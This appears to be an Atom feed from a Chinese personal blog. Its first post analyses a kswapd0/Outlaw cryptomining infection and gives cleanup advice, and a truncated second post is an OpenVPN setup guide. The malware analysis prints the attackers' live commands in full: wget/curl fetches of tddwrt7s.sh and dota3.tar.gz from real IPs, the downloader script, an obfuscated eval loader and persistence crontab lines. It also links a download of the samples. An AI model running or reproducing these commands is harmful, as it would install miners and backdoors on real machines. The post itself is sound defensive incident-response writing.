<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星星的猫(&gt;^ω^&lt;)喵</title>
  
  
  <link href="https://blog.shawncoding.top/atom.xml" rel="self"/>
  
  <link href="https://blog.shawncoding.top/"/>
  <updated>2024-02-29T12:12:58.665Z</updated>
  <id>https://blog.shawncoding.top/</id>
  
  <author>
    <name>Shawn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kswapd0挖矿病毒攻击记录</title>
    <link href="https://blog.shawncoding.top/posts/b2dd7295.html"/>
    <id>https://blog.shawncoding.top/posts/b2dd7295.html</id>
    <published>2024-02-29T12:10:38.000Z</published>
    <updated>2024-02-29T12:12:58.665Z</updated>
    
    <content type="html"><![CDATA[<h1>kswapd0挖矿病毒攻击记录</h1><h1>一、起因与病毒分析</h1><h2 id="1、起因">1、起因</h2><p>最近内网穿透服务以及自建的博客一直掉线，重启服务也不行，用 top 查看发现1个kswapd0进程占用了一整个核（机器是2C4G），遂查刚开始以为是使用swap分区与内存换页操作交换数据造成的，但是清理了缓存仍无果，最终发现被挖矿木马攻击了。</p><a id="more"></a><h2 id="2、阿里云告警">2、阿里云告警</h2><p>登陆阿里云控制台，也告警了阿里云异地登陆了，云安全中心显示凭证窃取，把我root密码爆破了</p><p><img src="http://qnypic.shawncoding.top/blog/202402291902435.png" alt></p><h3 id="2-1-恶意脚本代码执行1">2.1 恶意脚本代码执行1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c ./tddwrt7s.sh <span class="string">"http://167.172.213.233/dota3.tar.gz"</span> <span class="string">"http://5.161.227.142/dota3.tar.gz"</span> <span class="string">"http://216.70.68.24/dota3.tar.gz"</span> <span class="string">"http://104.131.132.54/dota3.tar.gz"</span> <span class="string">"http://172.104.46.33/dota3.tar.gz"</span> <span class="string">"http://37.139.10.109/dota3.tar.gz"</span> <span class="string">"http://46.101.132.59/dota3.tar.gz"</span> &gt;.out 2&gt;&amp;1 3&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902436.png" alt></p><h3 id="2-2-恶意脚本代码执行2">2.2 恶意脚本代码执行2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c wget -q http://161.35.236.24/tddwrt7s.sh || curl -s -O -f http://161.35.236.24/tddwrt7s.sh 2&gt;&amp;1 3&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902437.png" alt></p><h3 id="2-3恶意脚本代码执行3">2.3恶意脚本代码执行3</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291902438.png" alt></p><h3 id="2-4-恶意脚本代码执行4">2.4 恶意脚本代码执行4</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.configrc5/a/kswapd0</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902439.png" alt></p><h2 id="3、病毒简单分析">3、病毒简单分析</h2><h3 id="3-1-病毒的初始化">3.1 病毒的初始化</h3><p><code>tddwrt7s.sh</code>脚本内容，脚本主要是下载dota3的病毒文件，并运行初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">"/tmp/.X2y1-unix/.rsync/c"</span> ]; <span class="keyword">then</span></span><br><span class="line">        cat /tmp/.X2y1-unix/.rsync/initall | bash 2&gt;1&amp;</span><br><span class="line">        <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cd</span> /tmp</span><br><span class="line">        rm -rf .ssh</span><br><span class="line">        rm -rf .mountfs</span><br><span class="line">        rm -rf .X2*</span><br><span class="line">        rm -rf .X3*</span><br><span class="line">        rm -rf .X25-unix</span><br><span class="line">        mkdir .X2y1-unix</span><br><span class="line">        <span class="built_in">cd</span> .X2y1-unix</span><br><span class="line">        RANGE=6</span><br><span class="line">        s=<span class="variable">$RANDOM</span></span><br><span class="line">        <span class="built_in">let</span> <span class="string">"s %= <span class="variable">$RANGE</span>"</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 0 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 15 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$1</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$1</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 1 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 5 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$2</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$2</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 2 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 25 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$3</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$3</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 3 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 10 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$4</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$4</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 4 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 30 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$5</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$5</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 5 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 15 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$6</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$6</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 6 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 55 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$7</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$7</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        sleep 60s</span><br><span class="line">        tar xvf dota3.tar.gz</span><br><span class="line">        sleep 10s</span><br><span class="line"><span class="comment">#       rm -rf dota3.tar.gz</span></span><br><span class="line">        <span class="built_in">cd</span> .rsync</span><br><span class="line">        cat /tmp/.X2y1-unix/.rsync/initall | bash 2&gt;1&amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>可以发现首先是运行了<code>/tmp/.X2y1-unix/.rsync/initall</code>脚本，打开发现进行了shell混淆，最后eval命令会执行其后的参数作为Shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="string">"</span></span><br><span class="line"><span class="string">"</span>;qz=<span class="string">''</span>\<span class="string">''</span>&#123;pr<span class="string">';Fz='</span>&amp; pw<span class="string">';fz='</span> tsm<span class="string">';Zz='</span> go&gt;<span class="string">';CBz='</span>&#123;pri<span class="string">';Ez='</span> ~ &amp;<span class="string">';XBz='</span>p -v<span class="string">';Yz='</span>l -9<span class="string">';Vz='</span>tdd.<span class="string">';wBz='</span><span class="string">" ];';DCz='2 | ';Az='slee';qBz='p 10';SBz='-9 l';yBz='n';UBz='nux';dz='&gt; .o';nz='-v g';iz='`ps ';Gz='d)';gz='kill';pz='awk ';jBz=' '\''&#123;p';Dz='<span class="variable">$(cd';kBz='rint';gBz='grep';oz='rep|';lz='un|g';cBz='t $1';kz='ep r';nBz='cat ';vz='ep g';VBz='ep x';hz=' -9 ';Cz='dir=';RBz='mrig';bBz='prin';GBz='sm|g';HBz='chat';Bz='p 1';Lz='E';CCz='else';xz='ep -';OBz='kr -';lBz=' $1&#125;';Xz='pkil';ABz='ep|a';ZBz='p|aw';tz='`&gt; .';hBz=' -v ';KBz='~/.c';jz='x|gr';pBz=' | s';eBz='ep l';FBz='ep t';fBz='nux|';vBz='grc5';Uz='.x*';Sz='nu.*';LBz='onfi';mBz=''\''`';oBz='init';Tz='.F*';uz='out';ez='ut';aBz='k '\''&#123;';wz='o|gr';Rz='h';yz='v gr';IBz='tr -';cz=' run';WBz='|gre';Wz='sh';rBz='if [';Nz='dev/';ACz='exit';iBz='|awk';Oz='shm/';Jz='tmp/';BCz=' 0';TBz='d-li';Hz='rm -';bz='t';Mz='E*';tBz='"$di';JBz='iaR ';dBz='&#125;'\''`';PBz='all ';BBz='wk '\''';mz='rep ';NBz='lock';ECz='fi';Qz='nu.s';DBz='nt $';az=' .ou';rz='int ';uBz='r/.c';sz='$1&#125;'\''';Iz='rf /';EBz='1&#125;'\''`';xBz=' the';QBz='-9 x';YBz=' gre';MBz='grc*';Kz='.FIL';sBz=' -d ';Pz='var/';</span></span></span><br><span class="line"><span class="string"><span class="variable">eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$z$Hz$Iz$Jz$Kz$Mz$z$Hz$Iz$Nz$Oz$Kz$Mz$z$Hz$Iz$Nz$Oz$Kz$Lz$z$Hz$Iz$Pz$Jz$Kz$Lz$z$Hz$Iz$Pz$Jz$Kz$Mz$z$Hz$Iz$Jz$Qz$Rz$z$Hz$Iz$Jz$Sz$z$Az$Bz$z$Hz$Iz$Nz$Oz$Qz$Rz$z$Hz$Iz$Nz$Oz$Sz$z$Hz$Iz$Jz$Tz$z$Hz$Iz$Jz$Uz$z$Hz$Iz$Jz$Vz$Wz$z$Xz$Yz$Zz$az$bz$z$Xz$Yz$cz$dz$ez$z$Xz$Yz$fz$dz$ez$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$gz$hz$iz$jz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$dz$ez$z$gz$hz$iz$jz$FBz$GBz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$HBz$IBz$JBz$KBz$LBz$MBz$z$NBz$OBz$JBz$KBz$LBz$MBz$z$gz$PBz$QBz$RBz$z$gz$PBz$SBz$TBz$UBz$z$Az$Bz$z$gz$hz$iz$jz$VBz$RBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$z$gz$hz$iz$jz$eBz$TBz$fBz$gBz$hBz$gBz$iBz$jBz$kBz$lBz$mBz$z$nBz$oBz$pBz$Rz$z$Az$qBz$z$rBz$sBz$tBz$uBz$LBz$vBz$wBz$xBz$yBz$z$ACz$BCz$z$CCz$z$nBz$oBz$DCz$Wz$z$ECz$z$ACz$BCz"</span></span></span><br></pre></td></tr></table></figure><p>我们首先进行解密，利用bash的调试模式即可<code>bash -x xxx.sh</code>，注意这是追踪模式，命令还是会运行，这里主要就是病毒的初始化运行，将一些服务暂停，缓存文件进行删除。后面就是几个脚本的定时执行，加入公钥，修改定时任务，开始挖矿</p><h3 id="3-2-病毒本体执行">3.2 病毒本体执行</h3><p>首先看了一下.ssh，把我的.ssh删除了，加入了它的公钥。然后看一下定时任务，哦吼，定时任务被修改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br><span class="line"></span><br><span class="line">5 6 * * 0 /root/.configrc5/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.configrc5/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 /root/.configrc5/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.configrc5/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">0 0 */3 * * /tmp/.X2y1-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>从定时任务可以看出，主要是两个文件目录，一个是<code>/root/.configrc5</code>，还有一个是<code>/tmp/.X2y1-unix</code>（都是隐藏目录，很狡猾），注意还有一个<code>/tmp/up.txt</code>文件，这就是被爆破的root账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /root/.configrc5目录结构，病毒所在目录</span></span><br><span class="line">├── a</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── bash.pid</span><br><span class="line">│   ├── cert_key.pem</span><br><span class="line">│   ├── cert.pem</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── init0</span><br><span class="line">│   ├── kswapd0</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── upd</span><br><span class="line">├── b</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── sync</span><br><span class="line">├── cron.d</span><br><span class="line">└── dir2.dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/.X2y1-unix/.rsync目录结构</span></span><br><span class="line">├── 1</span><br><span class="line">├── a</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── init0</span><br><span class="line">│   ├── kswapd0</span><br><span class="line">│   ├── run</span><br><span class="line">│   └── stop</span><br><span class="line">├── b</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── run</span><br><span class="line">│   └── stop</span><br><span class="line">├── c</span><br><span class="line">│   ├── aptitude</span><br><span class="line">│   ├── blitz</span><br><span class="line">│   ├── blitz32</span><br><span class="line">│   ├── blitz64</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── go</span><br><span class="line">│   ├── n</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── start</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── v</span><br><span class="line">├── dir.dir</span><br><span class="line">├── init</span><br><span class="line">├── init0</span><br><span class="line">├── init2</span><br><span class="line">└── initall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/root/.configrc/*      <span class="comment">#病毒所在目录</span></span><br><span class="line">/root/.ssh/          <span class="comment">#病毒公钥</span></span><br><span class="line">/tmp/.X2y1-unix/.rsync/*    <span class="comment">#病毒运行缓存文件</span></span><br><span class="line">/tmp/.X2y1-unix/dota3.tar.gz  <span class="comment">#病毒压缩包</span></span><br><span class="line">/root/.configrc5/a/kswapd0    <span class="comment">#病毒主程序</span></span><br></pre></td></tr></table></figure><p>然后就是<strong>a.kswapd0</strong>和<strong>c.blitiz64</strong> 两个执行程序，执行程序加入了混淆加密。<strong>b.run</strong> 是一段perl脚本，可以<a href="https://base64.us/" target="_blank" rel="noopener" title="base64解密">base64解密</a>。具体的文件代码可以参考，有兴趣的可以研究一下。<a href="http://qnypic.shawncoding.top/file/share/dota3%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92.zip" target="_blank" rel="noopener" title="下载地址">下载地址</a></p><p><img src="http://qnypic.shawncoding.top/blog/202402291902440.png" alt></p><h2 id="4、总结">4、总结</h2><p>Outlaw病毒通过SSH<strong>攻击，访问目标系统并下载带有shell脚本、挖矿木马、后门木马的TAR压缩包文件dota3.tar.gz。解压后的文件目录可以看到，根目录rsync下存放初始化脚本，a目录下存放shellbot后门，b目录下存放挖矿木马，c目录下存放SSH</strong>攻击程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用的日志分析技巧</span></span><br><span class="line"><span class="comment"># 定位有多少IP在爆破主机的root帐号：</span></span><br><span class="line">grep <span class="string">"Failed password for root"</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="comment"># 定位有哪些IP在爆破：</span></span><br><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log|grep -E -o <span class="string">"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c</span><br><span class="line"><span class="comment"># 爆破用户名字典是什么？</span></span><br><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log|perl -e <span class="string">'while($_=&lt;&gt;)&#123; /for(.*?) from/; print "$1\n";&#125;'</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 登录成功的IP有哪些：</span></span><br><span class="line">grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="comment"># 登录成功的日期、用户名、IP：</span></span><br><span class="line">grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $1,$2,$3,$9,$11&#125;'</span></span><br></pre></td></tr></table></figure><h1>二、ubuntu自救指南</h1><h2 id="1、病毒清理">1、病毒清理</h2><p>1、top + kill -9 首先停止可疑进程</p><p>2、清理定时任务crontab -e</p><p>3、删除相关后门ssh key内容，<code>vim /root/.ssh/authorized_keys</code></p><p>4、删除/tmp目录下缓存文件（不同病毒可能不一样），<code>rm -rf .X2y1-unix/</code></p><p>5、删除病毒目录和文件，<code>rm -rf /root/.configrc5</code></p><p>6、（其他暂时没发现后门，不过我发现病毒给的停止删除命令挺好使的）</p><h2 id="2、如何防御">2、如何防御</h2><p>1、修改我们的账号密码，加强复杂度，不要使用口令</p><p>2、公有云添加白名单策略，业务端口只允许公司出口IP访问</p><hr><p><a href="https://blog.csdn.net/subfate/article/details/106546646" target="_blank" rel="noopener" title="https://blog.csdn.net/subfate/article/details/106546646">https://blog.csdn.net/subfate/article/details/106546646</a></p><p><a href="https://www.cnblogs.com/autopwn/p/17355657.html" target="_blank" rel="noopener" title="https://www.cnblogs.com/autopwn/p/17355657.html">https://www.cnblogs.com/autopwn/p/17355657.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;kswapd0挖矿病毒攻击记录&lt;/h1&gt;
&lt;h1&gt;一、起因与病毒分析&lt;/h1&gt;
&lt;h2 id=&quot;1、起因&quot;&gt;1、起因&lt;/h2&gt;
&lt;p&gt;最近内网穿透服务以及自建的博客一直掉线，重启服务也不行，用 top 查看发现1个kswapd0进程占用了一整个核（机器是2C4G），遂查刚开始以为是使用swap分区与内存换页操作交换数据造成的，但是清理了缓存仍无果，最终发现被挖矿木马攻击了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux运维" scheme="https://blog.shawncoding.top/categories/Linux%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="linux基础" scheme="https://blog.shawncoding.top/tags/linux%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>OpenVPN 安装与使用</title>
    <link href="https://blog.shawncoding.top/posts/2ec63753.html"/>
    <id>https://blog.shawncoding.top/posts/2ec63753.html</id>
    <published>2024-02-29T12:10:25.000Z</published>
    <updated>2024-02-29T12:11:24.767Z</updated>
    
    <content type="html"><![CDATA[<h1>OpenVPN 安装与使用</h1><h1>一、一键安装与使用</h1><h2 id="1、服务端安装使用">1、服务端安装使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入Linux服务器以后，请使用下面的一键安装命令</span></span><br><span class="line"><span class="comment"># 脚本来源于开源Github:https://github.com/Nyr/openvpn-install</span></span><br><span class="line"><span class="comment"># 可能会下载失败，需要手动或者科学</span></span><br><span class="line">wget https://git.io/vpn -O openvpn-install.sh &amp;&amp; bash openvpn-install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装失败的话，先下载在执行</span></span><br><span class="line">bash openvpn-install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># 另一个脚本，但是大差不差，可以结合使用</span></span><br><span class="line"><span class="comment"># https://github.com/hwdsl2/openvpn-install/blob/master/README-zh.md</span></span><br></pre></td></tr></table></figure><p>然后按照流程选择，注意公网的ip和端口要保证通</p><a id="more"></a><p><img src="http://qnypic.shawncoding.top/blog/202402291902388.png" alt></p><p>都提示success代表安装成功，然后根据上图底部的提示路径把ovpn文件下载下来，对于管理客户端，就再次执行<code>bash openvpn-install.sh</code>，可以添加、删除、查看等，网段默认是10.8.0.x，按照客户端启动顺序给予分配ip，同时客户端可以访问server端所在的内网(可以使用route命令查看，原因是转发到vpn网卡的流量全部进行了转发)</p><h2 id="2、客户端启动">2、客户端启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows下载，打开后导入下载的ovpn文件，连接即可</span></span><br><span class="line">https://openvpn.net/community-downloads/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux客户端启动</span></span><br><span class="line">yum install openvpn -y</span><br><span class="line"><span class="comment"># 启动Linux客户端的openvpn</span></span><br><span class="line"><span class="comment"># 详细版本</span></span><br><span class="line"><span class="comment"># --daemon：openvpn以daemon方式启动</span></span><br><span class="line"><span class="comment"># --cd dir：配置文件的目录，openvpn初始化前，先切换到此目录</span></span><br><span class="line"><span class="comment"># --config file：客户端配置文件的路径</span></span><br><span class="line"><span class="comment"># --log-append file：日志文件路径，如果文件不存在会自动创建</span></span><br><span class="line">openvpn --daemon --<span class="built_in">cd</span> /etc/openvpn --config client.ovpn --<span class="built_in">log</span>-append /var/<span class="built_in">log</span>/openvpn.log</span><br><span class="line"><span class="comment"># 快速版本</span></span><br><span class="line">openvpn --daemon --config xxxx.ovpn</span><br></pre></td></tr></table></figure><h1>二、使用进阶</h1><h2 id="1、网段与静态ip">1、网段与静态ip</h2><h3 id="1-1-启停脚本">1.1 启停脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动启停的脚本路径</span></span><br><span class="line"><span class="comment"># /etc/systemd/system/multi-user.target.wants/openvpn-server@server.service</span></span><br><span class="line"><span class="comment">#启动openvpn命令</span></span><br><span class="line">systemctl start openvpn-server@server.service </span><br><span class="line"><span class="comment">#停止openvpn命令</span></span><br><span class="line">systemctl stop openvpn-server@server.service</span><br></pre></td></tr></table></figure><h3 id="1-2-网段修改">1.2 网段修改</h3><p>默认启动网段都是10.8.0.x，如果想修改自定义网段，进入<code>vim /etc/openvpn/server/server.conf</code>，修改对应的配置，重启server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到这行，进行修改</span></span><br><span class="line">server 192.168.0.0 255.255.255.0</span><br></pre></td></tr></table></figure><h3 id="1-3-静态ip设置">1.3 静态ip设置</h3><p>修改server.conf文件，然后对server端进行重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有多个内网及公网的机器需要打通然后部署了openvpn服务，但是一旦有机器重启就好导致ip发生变化</span></span><br><span class="line"><span class="comment"># 在 VPN 服务器上创建一个客户端配置文件目录。例如，可以在/etc/openvpn/ccd 目录下创建一个子目录</span></span><br><span class="line">sudo mkdir /etc/openvpn/ccd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑 VPN 服务器配置文件，添加以下内容</span></span><br><span class="line"><span class="comment"># 告诉 OpenVPN 使用 /etc/openvpn/ccd 目录中的配置文件为每个客户端分配固定的 IP 地址，并将 IP 地址持久保存在 ipp.txt 文件中</span></span><br><span class="line">client-config-dir /etc/openvpn/ccd</span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于每个客户端，创建一个与其名称对应的配置文件，并指定需要分配给该客户端的固定 IP 地址</span></span><br><span class="line"><span class="comment"># 例如，如果有一个名为 client1 的客户端，可以创建一个名为 /etc/openvpn/ccd/client1 的文件，并在其中写入以下内容：</span></span><br><span class="line">ifconfig-push 10.8.0.10 255.255.255.0</span><br><span class="line"><span class="comment"># 可以为每个客户端创建类似的配置文件，只需更改 IP 地址即可，注意名字匹配</span></span><br><span class="line"><span class="comment"># 最后重启一下服务端即可</span></span><br></pre></td></tr></table></figure><h2 id="2、全量转发与选择性转发">2、全量转发与选择性转发</h2><p>默认不配置是全量转发，如果有多个内网网卡，可以设置选择性转发，在配置文件增加对应配置即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #ignore-unknown-option block-outside-dns 、#block-outside-dns 一定要注释</span></span><br><span class="line"><span 